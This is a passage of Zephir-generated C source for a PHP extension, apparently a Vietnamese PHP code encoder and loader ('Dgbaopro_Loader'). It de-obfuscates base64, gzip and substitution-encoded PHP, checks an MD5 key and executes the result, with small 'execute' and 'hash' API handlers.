			ZEPHIR_CALL_FUNCTION(&_7$$4, "chr", &_8, 17, &_6$$4);
			zephir_check_call_status();
			ZEPHIR_INIT_NVAR(&_9$$4);
			ZEPHIR_CONCAT_VV(&_9$$4, &_5$$4, &_7$$4);
			zephir_concat_self(&g$$3, &_9$$4);
			i$$3 = (i$$3 + 1);
		}
		ZEPHIR_INIT_VAR(&h$$3);
		ZVAL_STRING(&h$$3, "");
		while (1) {
			if (!(l > 0)) {
				break;
			}
			ZVAL_LONG(&_10$$5, l);
			ZEPHIR_CALL_FUNCTION(&_11$$5, "chr", &_8, 17, &_10$$5);
			zephir_check_call_status();
			zephir_array_fetch_long(&_12$$5, &op$$3, l, PH_NOISY | PH_READONLY, "dichvucoder.com", 338);
			ZEPHIR_INIT_NVAR(&_13$$5);
			ZEPHIR_CONCAT_VV(&_13$$5, &_11$$5, &_12$$5);
			zephir_concat_self(&h$$3, &_13$$5);
			l = (l - 1);
		}
		ZEPHIR_INIT_VAR(&_14$$3);
		ZEPHIR_CONCAT_VVV(&_14$$3, &h$$3, &k, &g$$3);
		zephir_get_strval(&k, &_14$$3);
		ZEPHIR_INIT_VAR(&_15$$3);
		zephir_md5(&_15$$3, &k);
		zephir_get_strval(&k, &_15$$3);
		ZEPHIR_CALL_STATIC(&oct$$3, "_______________________", &_16, 27, &oc, &k);
		zephir_check_call_status();
		ZEPHIR_INIT_VAR(&_17$$3);
		zephir_fast_explode_str(&_17$$3, SL("$$$"), &oct$$3, LONG_MAX);
		zephir_array_fetch_long(&_18$$3, &_17$$3, 1, PH_NOISY | PH_READONLY, "dichvucoder.com", 344);
		ZEPHIR_CPY_WRT(&oct$$3, &_18$$3);
		ZEPHIR_INIT_VAR(&opt$$3);
		array_init(&opt$$3);
		ZEPHIR_INIT_NVAR(&opt$$3);
		zephir_fast_explode_str(&opt$$3, SL(";"), &oct$$3, LONG_MAX);
		ZEPHIR_INIT_VAR(&rs$$3);
		ZVAL_STRING(&rs$$3, "");
		ZEPHIR_INIT_VAR(&p$$3);
		ZVAL_STRING(&p$$3, "");
		zephir_is_iterable(&opt$$3, 0, "dichvucoder.com", 352);
		if (Z_TYPE_P(&opt$$3) == IS_ARRAY) {
			ZEND_HASH_FOREACH_VAL(Z_ARRVAL_P(&opt$$3), _19$$3)
			{
				ZEPHIR_INIT_NVAR(&p$$3);
				ZVAL_COPY(&p$$3, _19$$3);
				zephir_array_fetch(&_21$$6, &op$$3, &p$$3, PH_NOISY | PH_READONLY, "dichvucoder.com", 350);
				zephir_concat_self(&rs$$3, &_21$$6);
			} ZEND_HASH_FOREACH_END();
		} else {
			ZEPHIR_CALL_METHOD(NULL, &opt$$3, "rewind", NULL, 0);
			zephir_check_call_status();
			while (1) {
				ZEPHIR_CALL_METHOD(&_20$$3, &opt$$3, "valid", NULL, 0);
				zephir_check_call_status();
				if (!zend_is_true(&_20$$3)) {
					break;
				}
				ZEPHIR_CALL_METHOD(&p$$3, &opt$$3, "current", NULL, 0);
				zephir_check_call_status();
					zephir_array_fetch(&_22$$7, &op$$3, &p$$3, PH_NOISY | PH_READONLY, "dichvucoder.com", 350);
					zephir_concat_self(&rs$$3, &_22$$7);
				ZEPHIR_CALL_METHOD(NULL, &opt$$3, "next", NULL, 0);
				zephir_check_call_status();
			}
		}
		ZEPHIR_INIT_NVAR(&p$$3);
		RETURN_CCTOR(&rs$$3);
	} else {
		ZEPHIR_INIT_VAR(&_23$$8);
		ZVAL_STRING(&_23$$8, "Encode ERROR : Không tìm thấy API !\n");
		ZEPHIR_CALL_FUNCTION(NULL, "print_r", NULL, 1, &_23$$8);
		zephir_check_call_status();
		zephir_read_static_property_ce(&_24$$8, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
		_25$$8 = zephir_is_true(&_24$$8);
		if (_25$$8) {
			zephir_read_static_property_ce(&_26$$8, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
			_25$$8 = !ZEPHIR_IS_FALSE_IDENTICAL(&_26$$8);
		}
		if (_25$$8) {
			ZVAL_BOOL(&_28$$9, 1);
			ZEPHIR_CALL_STATIC(NULL, "__", &_27, 2, &_28$$9);
			zephir_check_call_status();
		}
		ZEPHIR_MM_RESTORE();
		zephir_exit_empty();
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, f__)
{
	zend_string *_11$$4, *_16$$9;
	zend_ulong _10$$4, _15$$9;
	zend_bool _1, _19$$14;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zephir_fcall_cache_entry *_4 = NULL, *_21 = NULL;
	zval *__param = NULL, *___param = NULL, _0, _2, _3$$3, ____$$3, k$$3, v$$3, r$$3, z$$3, *_5$$3, _6$$3, _7$$4, *_8$$4, _9$$4, _12$$9, *_13$$9, _14$$9, _17$$14, _18$$14, _20$$14, _22$$15;
	zval _, __;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_2);
	ZVAL_UNDEF(&_3$$3);
	ZVAL_UNDEF(&____$$3);
	ZVAL_UNDEF(&k$$3);
	ZVAL_UNDEF(&v$$3);
	ZVAL_UNDEF(&r$$3);
	ZVAL_UNDEF(&z$$3);
	ZVAL_UNDEF(&_6$$3);
	ZVAL_UNDEF(&_7$$4);
	ZVAL_UNDEF(&_9$$4);
	ZVAL_UNDEF(&_12$$9);
	ZVAL_UNDEF(&_14$$9);
	ZVAL_UNDEF(&_17$$14);
	ZVAL_UNDEF(&_18$$14);
	ZVAL_UNDEF(&_20$$14);
	ZVAL_UNDEF(&_22$$15);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(2, 2)
		Z_PARAM_STR(_)
		Z_PARAM_STR(__)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 2, 0, &__param, &___param);
	zephir_get_strval(&_, __param);
	zephir_get_strval(&__, ___param);


	zephir_read_static_property_ce(&_0, dgbaopro_loader_ce, SL("p"), PH_NOISY_CC | PH_READONLY);
	_1 = zephir_is_true(&_0);
	if (_1) {
		zephir_read_static_property_ce(&_2, dgbaopro_loader_ce, SL("l"), PH_NOISY_CC | PH_READONLY);
		_1 = zephir_is_true(&_2);
	}
	if (_1) {
		ZEPHIR_CALL_STATIC(&_3$$3, "_", &_4, 11, &_, &__);
		zephir_check_call_status();
		zephir_get_strval(&_, &_3$$3);
		ZEPHIR_INIT_VAR(&____$$3);
		ZVAL_STRING(&____$$3, "");
		ZEPHIR_INIT_VAR(&k$$3);
		ZVAL_STRING(&k$$3, "");
		ZEPHIR_INIT_VAR(&v$$3);
		ZVAL_STRING(&v$$3, "");
		ZEPHIR_INIT_VAR(&r$$3);
		ZVAL_STRING(&r$$3, "");
		ZEPHIR_INIT_VAR(&z$$3);
		ZVAL_STRING(&z$$3, "");
		ZEPHIR_CALL_FUNCTION(&z$$3, "str_split", NULL, 26, &_);
		zephir_check_call_status();
		zephir_is_iterable(&z$$3, 0, "dichvucoder.com", 377);
		if (Z_TYPE_P(&z$$3) == IS_ARRAY) {
			ZEND_HASH_FOREACH_VAL(Z_ARRVAL_P(&z$$3), _5$$3)
			{
				ZEPHIR_INIT_NVAR(&r$$3);
				ZVAL_COPY(&r$$3, _5$$3);
				zephir_read_static_property_ce(&_7$$4, dgbaopro_loader_ce, SL("table"), PH_NOISY_CC | PH_READONLY);
				zephir_is_iterable(&_7$$4, 0, "dichvucoder.com", 376);
				if (Z_TYPE_P(&_7$$4) == IS_ARRAY) {
					ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL_P(&_7$$4), _10$$4, _11$$4, _8$$4)
					{
						ZEPHIR_INIT_NVAR(&k$$3);
						if (_11$$4 != NULL) { 
							ZVAL_STR_COPY(&k$$3, _11$$4);
						} else {
							ZVAL_LONG(&k$$3, _10$$4);
						}
						ZEPHIR_INIT_NVAR(&v$$3);
						ZVAL_COPY(&v$$3, _8$$4);
						if (ZEPHIR_IS_EQUAL(&r$$3, &v$$3)) {
							zephir_concat_self(&____$$3, &k$$3);
						}
					} ZEND_HASH_FOREACH_END();
				} else {
					ZEPHIR_CALL_METHOD(NULL, &_7$$4, "rewind", NULL, 0);
					zephir_check_call_status();
					while (1) {
						ZEPHIR_CALL_METHOD(&_9$$4, &_7$$4, "valid", NULL, 0);
						zephir_check_call_status();
						if (!zend_is_true(&_9$$4)) {
							break;
						}
						ZEPHIR_CALL_METHOD(&k$$3, &_7$$4, "key", NULL, 0);
						zephir_check_call_status();
						ZEPHIR_CALL_METHOD(&v$$3, &_7$$4, "current", NULL, 0);
						zephir_check_call_status();
							if (ZEPHIR_IS_EQUAL(&r$$3, &v$$3)) {
								zephir_concat_self(&____$$3, &k$$3);
							}
						ZEPHIR_CALL_METHOD(NULL, &_7$$4, "next", NULL, 0);
						zephir_check_call_status();
					}
				}
				ZEPHIR_INIT_NVAR(&v$$3);
				ZEPHIR_INIT_NVAR(&k$$3);
			} ZEND_HASH_FOREACH_END();
		} else {
			ZEPHIR_CALL_METHOD(NULL, &z$$3, "rewind", NULL, 0);
			zephir_check_call_status();
			while (1) {
				ZEPHIR_CALL_METHOD(&_6$$3, &z$$3, "valid", NULL, 0);
				zephir_check_call_status();
				if (!zend_is_true(&_6$$3)) {
					break;
				}
				ZEPHIR_CALL_METHOD(&r$$3, &z$$3, "current", NULL, 0);
				zephir_check_call_status();
					zephir_read_static_property_ce(&_12$$9, dgbaopro_loader_ce, SL("table"), PH_NOISY_CC | PH_READONLY);
					zephir_is_iterable(&_12$$9, 0, "dichvucoder.com", 376);
					if (Z_TYPE_P(&_12$$9) == IS_ARRAY) {
						ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL_P(&_12$$9), _15$$9, _16$$9, _13$$9)
						{
							ZEPHIR_INIT_NVAR(&k$$3);
							if (_16$$9 != NULL) { 
								ZVAL_STR_COPY(&k$$3, _16$$9);
							} else {
								ZVAL_LONG(&k$$3, _15$$9);
							}
							ZEPHIR_INIT_NVAR(&v$$3);
							ZVAL_COPY(&v$$3, _13$$9);
							if (ZEPHIR_IS_EQUAL(&r$$3, &v$$3)) {
								zephir_concat_self(&____$$3, &k$$3);
							}
						} ZEND_HASH_FOREACH_END();
					} else {
						ZEPHIR_CALL_METHOD(NULL, &_12$$9, "rewind", NULL, 0);
						zephir_check_call_status();
						while (1) {
							ZEPHIR_CALL_METHOD(&_14$$9, &_12$$9, "valid", NULL, 0);
							zephir_check_call_status();
							if (!zend_is_true(&_14$$9)) {
								break;
							}
							ZEPHIR_CALL_METHOD(&k$$3, &_12$$9, "key", NULL, 0);
							zephir_check_call_status();
							ZEPHIR_CALL_METHOD(&v$$3, &_12$$9, "current", NULL, 0);
							zephir_check_call_status();
								if (ZEPHIR_IS_EQUAL(&r$$3, &v$$3)) {
									zephir_concat_self(&____$$3, &k$$3);
								}
							ZEPHIR_CALL_METHOD(NULL, &_12$$9, "next", NULL, 0);
							zephir_check_call_status();
						}
					}
					ZEPHIR_INIT_NVAR(&v$$3);
					ZEPHIR_INIT_NVAR(&k$$3);
				ZEPHIR_CALL_METHOD(NULL, &z$$3, "next", NULL, 0);
				zephir_check_call_status();
			}
		}
		ZEPHIR_INIT_NVAR(&r$$3);
		RETURN_CCTOR(&____$$3);
	} else {
		ZEPHIR_INIT_VAR(&_17$$14);
		ZVAL_STRING(&_17$$14, "Encode ERROR : Không tìm thấy API !\n");
		ZEPHIR_CALL_FUNCTION(NULL, "print_r", NULL, 1, &_17$$14);
		zephir_check_call_status();
		zephir_read_static_property_ce(&_18$$14, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
		_19$$14 = zephir_is_true(&_18$$14);
		if (_19$$14) {
			zephir_read_static_property_ce(&_20$$14, dgbaopro_loader_ce, SL("o"), PH_NOISY_CC | PH_READONLY);
			_19$$14 = !ZEPHIR_IS_FALSE_IDENTICAL(&_20$$14);
		}
		if (_19$$14) {
			ZVAL_BOOL(&_22$$15, 1);
			ZEPHIR_CALL_STATIC(NULL, "__", &_21, 2, &_22$$15);
			zephir_check_call_status();
		}
		ZEPHIR_MM_RESTORE();
		zephir_exit_empty();
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, exec)
{
	zend_string *_7$$3, *_12$$4, *_17$$9;
	zend_ulong _6$$3, _11$$4, _16$$9;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zephir_fcall_cache_entry *_2 = NULL;
	zval *__param = NULL, *___param = NULL, __$true, _0, _1$$3, _3$$3, r$$3, k$$3, v$$3, z$$3, m$$3, a$$3, *_4$$3, _5$$3, _24$$3, _25$$3, _8$$4, *_9$$4, _10$$4, _13$$9, *_14$$9, _15$$9, _18$$15, key$$15, _19$$15, _21$$15, _22$$15, _23$$15, _20$$16, _26$$17;
	zval _, __;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_BOOL(&__$true, 1);
	ZVAL_UNDEF(&_0);
	ZVAL_UNDEF(&_1$$3);
	ZVAL_UNDEF(&_3$$3);
	ZVAL_UNDEF(&r$$3);
	ZVAL_UNDEF(&k$$3);
	ZVAL_UNDEF(&v$$3);
	ZVAL_UNDEF(&z$$3);
	ZVAL_UNDEF(&m$$3);
	ZVAL_UNDEF(&a$$3);
	ZVAL_UNDEF(&_5$$3);
	ZVAL_UNDEF(&_24$$3);
	ZVAL_UNDEF(&_25$$3);
	ZVAL_UNDEF(&_8$$4);
	ZVAL_UNDEF(&_10$$4);
	ZVAL_UNDEF(&_13$$9);
	ZVAL_UNDEF(&_15$$9);
	ZVAL_UNDEF(&_18$$15);
	ZVAL_UNDEF(&key$$15);
	ZVAL_UNDEF(&_19$$15);
	ZVAL_UNDEF(&_21$$15);
	ZVAL_UNDEF(&_22$$15);
	ZVAL_UNDEF(&_23$$15);
	ZVAL_UNDEF(&_20$$16);
	ZVAL_UNDEF(&_26$$17);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(1, 2)
		Z_PARAM_STR(_)
		Z_PARAM_OPTIONAL
		Z_PARAM_STR_OR_NULL(__)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 1, 1, &__param, &___param);
	zephir_get_strval(&_, __param);
	if (!___param) {
		ZEPHIR_INIT_VAR(&__);
	} else {
		zephir_get_strval(&__, ___param);
	}


	zephir_read_static_property_ce(&_0, dgbaopro_loader_ce, SL("p"), PH_NOISY_CC | PH_READONLY);
	if (zephir_is_true(&_0)) {
		ZEPHIR_CALL_FUNCTION(&_1$$3, "base64_decode", &_2, 6, &_);
		zephir_check_call_status();
		zephir_get_strval(&_, &_1$$3);
		ZEPHIR_CALL_FUNCTION(&_3$$3, "gzinflate", NULL, 10, &_);
		zephir_check_call_status();
		zephir_get_strval(&_, &_3$$3);
		ZEPHIR_INIT_VAR(&r$$3);
		ZVAL_STRING(&r$$3, "");
		ZEPHIR_INIT_VAR(&k$$3);
		ZVAL_STRING(&k$$3, "");
		ZEPHIR_INIT_VAR(&v$$3);
		ZVAL_STRING(&v$$3, "");
		ZEPHIR_INIT_VAR(&z$$3);
		ZVAL_STRING(&z$$3, "");
		ZEPHIR_INIT_VAR(&m$$3);
		ZVAL_STRING(&m$$3, "");
		ZEPHIR_CALL_FUNCTION(&a$$3, "str_split", NULL, 26, &_);
		zephir_check_call_status();
		zephir_is_iterable(&a$$3, 0, "dichvucoder.com", 404);
		if (Z_TYPE_P(&a$$3) == IS_ARRAY) {
			ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL_P(&a$$3), _6$$3, _7$$3, _4$$3)
			{
				ZEPHIR_INIT_NVAR(&m$$3);
				if (_7$$3 != NULL) { 
					ZVAL_STR_COPY(&m$$3, _7$$3);
				} else {
					ZVAL_LONG(&m$$3, _6$$3);
				}
				ZEPHIR_INIT_NVAR(&z$$3);
				ZVAL_COPY(&z$$3, _4$$3);
				zephir_read_static_property_ce(&_8$$4, dgbaopro_loader_ce, SL("table"), PH_NOISY_CC | PH_READONLY);
				zephir_is_iterable(&_8$$4, 0, "dichvucoder.com", 403);
				if (Z_TYPE_P(&_8$$4) == IS_ARRAY) {
					ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL_P(&_8$$4), _11$$4, _12$$4, _9$$4)
					{
						ZEPHIR_INIT_NVAR(&k$$3);
						if (_12$$4 != NULL) { 
							ZVAL_STR_COPY(&k$$3, _12$$4);
						} else {
							ZVAL_LONG(&k$$3, _11$$4);
						}
						ZEPHIR_INIT_NVAR(&v$$3);
						ZVAL_COPY(&v$$3, _9$$4);
						if (ZEPHIR_IS_EQUAL(&z$$3, &v$$3)) {
							zephir_concat_self(&r$$3, &k$$3);
							break;
						}
					} ZEND_HASH_FOREACH_END();
				} else {
					ZEPHIR_CALL_METHOD(NULL, &_8$$4, "rewind", NULL, 0);
					zephir_check_call_status();
					while (1) {
						ZEPHIR_CALL_METHOD(&_10$$4, &_8$$4, "valid", NULL, 0);
						zephir_check_call_status();
						if (!zend_is_true(&_10$$4)) {
							break;
						}
						ZEPHIR_CALL_METHOD(&k$$3, &_8$$4, "key", NULL, 0);
						zephir_check_call_status();
						ZEPHIR_CALL_METHOD(&v$$3, &_8$$4, "current", NULL, 0);
						zephir_check_call_status();
							if (ZEPHIR_IS_EQUAL(&z$$3, &v$$3)) {
								zephir_concat_self(&r$$3, &k$$3);
								break;
							}
						ZEPHIR_CALL_METHOD(NULL, &_8$$4, "next", NULL, 0);
						zephir_check_call_status();
					}
				}
				ZEPHIR_INIT_NVAR(&v$$3);
				ZEPHIR_INIT_NVAR(&k$$3);
			} ZEND_HASH_FOREACH_END();
		} else {
			ZEPHIR_CALL_METHOD(NULL, &a$$3, "rewind", NULL, 0);
			zephir_check_call_status();
			while (1) {
				ZEPHIR_CALL_METHOD(&_5$$3, &a$$3, "valid", NULL, 0);
				zephir_check_call_status();
				if (!zend_is_true(&_5$$3)) {
					break;
				}
				ZEPHIR_CALL_METHOD(&m$$3, &a$$3, "key", NULL, 0);
				zephir_check_call_status();
				ZEPHIR_CALL_METHOD(&z$$3, &a$$3, "current", NULL, 0);
				zephir_check_call_status();
					zephir_read_static_property_ce(&_13$$9, dgbaopro_loader_ce, SL("table"), PH_NOISY_CC | PH_READONLY);
					zephir_is_iterable(&_13$$9, 0, "dichvucoder.com", 403);
					if (Z_TYPE_P(&_13$$9) == IS_ARRAY) {
						ZEND_HASH_FOREACH_KEY_VAL(Z_ARRVAL_P(&_13$$9), _16$$9, _17$$9, _14$$9)
						{
							ZEPHIR_INIT_NVAR(&k$$3);
							if (_17$$9 != NULL) { 
								ZVAL_STR_COPY(&k$$3, _17$$9);
							} else {
								ZVAL_LONG(&k$$3, _16$$9);
							}
							ZEPHIR_INIT_NVAR(&v$$3);
							ZVAL_COPY(&v$$3, _14$$9);
							if (ZEPHIR_IS_EQUAL(&z$$3, &v$$3)) {
								zephir_concat_self(&r$$3, &k$$3);
								break;
							}
						} ZEND_HASH_FOREACH_END();
					} else {
						ZEPHIR_CALL_METHOD(NULL, &_13$$9, "rewind", NULL, 0);
						zephir_check_call_status();
						while (1) {
							ZEPHIR_CALL_METHOD(&_15$$9, &_13$$9, "valid", NULL, 0);
							zephir_check_call_status();
							if (!zend_is_true(&_15$$9)) {
								break;
							}
							ZEPHIR_CALL_METHOD(&k$$3, &_13$$9, "key", NULL, 0);
							zephir_check_call_status();
							ZEPHIR_CALL_METHOD(&v$$3, &_13$$9, "current", NULL, 0);
							zephir_check_call_status();
								if (ZEPHIR_IS_EQUAL(&z$$3, &v$$3)) {
									zephir_concat_self(&r$$3, &k$$3);
									break;
								}
							ZEPHIR_CALL_METHOD(NULL, &_13$$9, "next", NULL, 0);
							zephir_check_call_status();
						}
					}
					ZEPHIR_INIT_NVAR(&v$$3);
					ZEPHIR_INIT_NVAR(&k$$3);
				ZEPHIR_CALL_METHOD(NULL, &a$$3, "next", NULL, 0);
				zephir_check_call_status();
			}
		}
		ZEPHIR_INIT_NVAR(&z$$3);
		ZEPHIR_INIT_NVAR(&m$$3);
		if (ZEPHIR_IS_NULL(&__)) {
			zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("l"), &__$true);
		} else {
			ZEPHIR_INIT_VAR(&_18$$15);
			zephir_md5(&_18$$15, &__);
			zephir_get_strval(&__, &_18$$15);
			ZVAL_LONG(&_19$$15, -32);
			ZEPHIR_INIT_VAR(&key$$15);
			zephir_substr(&key$$15, &r$$3, -32 , 0, ZEPHIR_SUBSTR_NO_LENGTH);
			if (!ZEPHIR_IS_IDENTICAL(&__, &key$$15)) {
				ZEPHIR_INIT_VAR(&_20$$16);
				ZVAL_STRING(&_20$$16, "Encode ERROR : Không thể đọc hash, sai key !\n");
				ZEPHIR_MM_RESTORE();
				zephir_exit(&_20$$16);
			}
			ZVAL_LONG(&_21$$15, 0);
			ZVAL_LONG(&_22$$15, (zephir_fast_strlen_ev(&r$$3) - 32));
			ZEPHIR_INIT_VAR(&_23$$15);
			zephir_substr(&_23$$15, &r$$3, 0 , zephir_get_intval(&_22$$15), 0);
			ZEPHIR_CPY_WRT(&r$$3, &_23$$15);
		}
		ZEPHIR_CALL_FUNCTION(&_24$$3, "base64_decode", &_2, 6, &r$$3);
		zephir_check_call_status();
		ZEPHIR_CPY_WRT(&r$$3, &_24$$3);
		ZEPHIR_INIT_VAR(&_25$$3);
		dgbaopro_exec(&r$$3, &_25$$3, "dichvucoder.com");
	} else {
		ZEPHIR_INIT_VAR(&_26$$17);
		ZVAL_STRING(&_26$$17, "Encode ERROR : Có lỗi xảy ra khi xử lý yêu cầu của bạn !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_26$$17);
	}
	ZEPHIR_MM_RESTORE();
}

PHP_METHOD(Dgbaopro_Loader, api)
{
	zend_bool _1$$3, _2$$3, _5$$6, _6$$6;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
	zend_long ZEPHIR_LAST_CALL_STATUS;
	zephir_fcall_cache_entry *_3 = NULL, *_7 = NULL;
	zval *__param = NULL, *___param = NULL, *____param = NULL, *_____param = NULL, _0;
	zval _, __, ___, ____, _4$$5, _8$$8, _9$$9;
	zval *this_ptr = getThis();

	ZVAL_UNDEF(&_);
	ZVAL_UNDEF(&__);
	ZVAL_UNDEF(&___);
	ZVAL_UNDEF(&____);
	ZVAL_UNDEF(&_4$$5);
	ZVAL_UNDEF(&_8$$8);
	ZVAL_UNDEF(&_9$$9);
	ZVAL_UNDEF(&_0);
#if PHP_VERSION_ID >= 80000
	bool is_null_true = 1;
	ZEND_PARSE_PARAMETERS_START(1, 4)
		Z_PARAM_STR(_)
		Z_PARAM_OPTIONAL
		Z_PARAM_STR_OR_NULL(__)
		Z_PARAM_STR_OR_NULL(___)
		Z_PARAM_STR_OR_NULL(____)
	ZEND_PARSE_PARAMETERS_END();
#endif


	ZEPHIR_MM_GROW();
	zephir_fetch_params(1, 1, 3, &__param, &___param, &____param, &_____param);
	zephir_get_strval(&_, __param);
	if (!___param) {
		ZEPHIR_INIT_VAR(&__);
	} else {
		zephir_get_strval(&__, ___param);
	}
	if (!____param) {
		ZEPHIR_INIT_VAR(&___);
	} else {
		zephir_get_strval(&___, ____param);
	}
	if (!_____param) {
		ZEPHIR_INIT_VAR(&____);
	} else {
		zephir_get_strval(&____, _____param);
	}


	ZEPHIR_INIT_VAR(&_0);
	zephir_fast_trim(&_0, &_, NULL , ZEPHIR_TRIM_BOTH);
	zephir_get_strval(&_, &_0);
	if (ZEPHIR_IS_STRING(&_, "execute")) {
		_1$$3 = ZEPHIR_IS_NULL(&__);
		if (_1$$3) {
			_1$$3 = ZEPHIR_IS_NULL(&___);
		}
		_2$$3 = _1$$3;
		if (_2$$3) {
			_2$$3 = ZEPHIR_IS_NULL(&____);
		}
		if (_2$$3) {
			ZEPHIR_CALL_STATIC(NULL, "___", &_3, 22);
			zephir_check_call_status();
		} else {
			ZEPHIR_INIT_VAR(&_4$$5);
			ZEPHIR_CONCAT_SVS(&_4$$5, "Encode ERROR : API ", &_, " : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_4$$5);
		}
	} else if (ZEPHIR_IS_STRING(&_, "hash")) {
		_5$$6 = !ZEPHIR_IS_NULL(&__);
		if (_5$$6) {
			_5$$6 = !ZEPHIR_IS_NULL(&___);
		}
		_6$$6 = _5$$6;
		if (_6$$6) {
			_6$$6 = ZEPHIR_IS_NULL(&____);
		}
		if (_6$$6) {
			ZEPHIR_CALL_STATIC(NULL, "exec", &_7, 8, &__, &___);
			zephir_check_call_status();
		} else {
			ZEPHIR_INIT_VAR(&_8$$8);
			ZEPHIR_CONCAT_SVS(&_8$$8, "Encode ERROR : API ", &_, " : Lỗi tham số đầu vào !\n");
			ZEPHIR_MM_RESTORE();
			zephir_exit(&_8$$8);
		}
	} else {
		ZEPHIR_INIT_VAR(&_9$$9);
		ZEPHIR_CONCAT_SVS(&_9$$9, "Encode ERROR : API ", &_, " not found !\n");
		ZEPHIR_MM_RESTORE();
		zephir_exit(&_9$$9);
	}
	ZEPHIR_MM_RESTORE();
}

void zephir_init_static_properties_Dgbaopro_Loader()
{
	zval _0;
	zephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;
		ZVAL_UNDEF(&_0);


	ZEPHIR_MM_GROW();

	ZEPHIR_INIT_VAR(&_0);
	array_init(&_0);
	zephir_update_static_property_ce(dgbaopro_loader_ce, ZEND_STRL("table"), &_0);
	ZEPHIR_MM_RESTORE();
}

